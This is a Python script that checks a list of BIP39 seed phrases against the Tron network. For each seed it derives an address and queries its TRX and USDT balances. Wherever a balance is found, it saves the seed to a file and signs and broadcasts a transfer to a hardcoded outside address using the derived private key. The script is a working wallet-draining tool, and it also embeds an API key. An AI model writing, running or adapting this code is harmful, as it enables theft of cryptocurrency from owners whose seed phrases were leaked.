import asyncio
import sys, os, json, time, random
from os.path import exists

from hdwallet import HDWallet
from hdwallet.mnemonics import BIP39Mnemonic
from hdwallet.cryptocurrencies import Tron as Cryptocurrency
from hdwallet.derivations import BIP44Derivation, CHANGES
from hdwallet.hds import BIP32HD

from tronpy import Tron
from tronpy.keys import PrivateKey
from tronpy.providers import HTTPProvider


class Scanner:
    def __init__(self, threads=10):
        self.sem = asyncio.Semaphore(threads)

        
        self.client = Tron(
            HTTPProvider(api_key="ed68c908-a4df-443d-9bea-1a747d3ec8be")
        )

        
        self.contract = self.client.get_contract(
            "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"
        )
        self.precision = self.contract.functions.decimals()

    async def seek(self, seed):
        async with self.sem:
            await asyncio.to_thread(self._process_seed, seed)

    def retry(self, func, *args, retries=5):
        for i in range(retries):
            try:
                return func(*args)
            except Exception as e:
                if "429" in str(e) or "Too Many Requests" in str(e):
                    wait = (i + 1) * 2
                    print(f"[429] retry in {wait}s...")
                    time.sleep(wait)
                else:
                    raise
        return None

    def _process_seed(self, seed):
        try:
            
            time.sleep(random.uniform(0.2, 0.6))

            hdwallet: HDWallet = HDWallet(
                cryptocurrency=Cryptocurrency,
                hd=BIP32HD,
                network=Cryptocurrency.NETWORKS.MAINNET,
            ).from_mnemonic(
                mnemonic=BIP39Mnemonic(mnemonic=seed)
            ).from_derivation(
                derivation=BIP44Derivation(
                    coin_type=Cryptocurrency.COIN_TYPE,
                    account=0,
                    change=CHANGES.EXTERNAL_CHAIN,
                    address=0
                )
            )

            data = json.loads(json.dumps(hdwallet.dump(exclude={"indexes"})))
            address = data['derivation']['address']
            priv = data['derivation']['private_key']

            
            trx_balance = self.retry(self.client.get_account_balance, address)

            usdt_raw = self.retry(self.contract.functions.balanceOf, address)
            usdt_balance = (usdt_raw or 0) / 10 ** self.precision

            if float(trx_balance or 0) > 0 or float(usdt_balance) > 0:
                print(f"\n[+] FOUND BALANCE")
                print(f"SEED : {seed}")
                print(f"ADDR : {address}")
                print(f"TRX  : {trx_balance}")
                print(f"USDT : {usdt_balance}\n\n")

                with open("tron.txt", "a") as f:
                    f.write(seed + "\n")

                
                try:
                    priv_key = PrivateKey(bytes.fromhex(priv))
                    txn = (
                        self.client.trx.transfer(
                            address,
                            "TQvbqXkpNUmEeTu7cEaEjAAjXg4WVTBHfr",
                            1_000
                        )
                        .memo("test memo")
                        .build()
                        .sign(priv_key)
                        .broadcast()
                    )

                    print("[TX SENT]")
                    print(txn)
                    print(txn.wait())

                except Exception as tx_err:
                    print(f"[TX ERROR] {tx_err}")

            else:
                print(f"[-] {address} | empty")

        except Exception as e:
            exc_type, _, exc_tb = sys.exc_info()
            #print(f"[ERROR] {exc_type} line {exc_tb.tb_lineno} -> {e}")

    async def run(self, input_file):
        tasks = []

        with open(input_file, "r") as f:
            seeds = f.read().splitlines()

        for seed in seeds:
            if seed.strip():
                tasks.append(asyncio.create_task(self.seek(seed)))

        await asyncio.gather(*tasks)


if __name__ == "__main__":
    input_file = input("List : ")
    threads = int(input("Thread (1-5 recommended): "))

    if not exists(input_file):
        print("File not found")
        exit()

    scanner = Scanner(threads)
    asyncio.run(scanner.run(input_file))
